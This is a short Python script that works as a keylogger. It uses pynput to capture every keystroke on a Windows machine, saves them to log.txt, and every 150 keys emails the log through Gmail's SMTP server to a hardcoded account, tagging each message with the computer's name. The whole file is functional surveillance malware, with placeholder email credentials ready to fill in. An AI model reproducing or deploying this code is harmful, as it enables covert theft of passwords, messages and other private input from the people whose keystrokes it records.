import os
import smtplib
from pynput.keyboard import Listener, Key
from email.message import EmailMessage

count = 0
keys = []
keyBefore = ""

DESKTOP_NAME = str(os.environ['COMPUTERNAME'])

EMAIL_ADRESS = "google-email"
EMAIL_PASSWORD = "email-password"

msg = EmailMessage()
msg['Subject'] = 'Logs'
msg['From'] = EMAIL_ADRESS
msg['To'] = EMAIL_ADRESS
msg.set_content('Logs from '+ DESKTOP_NAME)

def on_press(key):
    global count,keys, keyBefore

    keys.append(key)
    count += 1

    if os.path.isfile('log.txt') == False:
        write_file("w",keys)
    else:
        write_file("a",keys)

    keyBefore = keys[0]
    keys = []

    if count > 150:
        count = 0
        send_email()


def write_file(type, keys):
    global keyBefore

    with open("log.txt", type) as file:
        for key in keys:
            k = str(key).replace("'","")
            keyBefore = str(keyBefore).replace("'","")

            if k.find("ey.space") > 0:
                k = ""
            elif keyBefore.find("ey.") < 0 and k.find("ey.") > 0:
                k = "\n" + k
            elif keyBefore.find("ey.") > 0:
                k = "\n" + k

            file.write(k)

            if k.find("ey.insert") > 0:
                file.write("\n \n END \n\n")


def on_release(key):

    if key == Key.insert:
        return False


def send_email():

    with open('log.txt', 'rb') as f:
        file_data = f.read()
        file_name = f.name

    msg.add_attachment(file_data, maintype='application', subtype='octet-stream', filename=file_name)

    with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp:

        smtp.login(EMAIL_ADRESS, EMAIL_PASSWORD)
        smtp.send_message(msg)

with Listener (on_press=on_press, on_release=on_release) as listener:

    listener.join()


send_email()
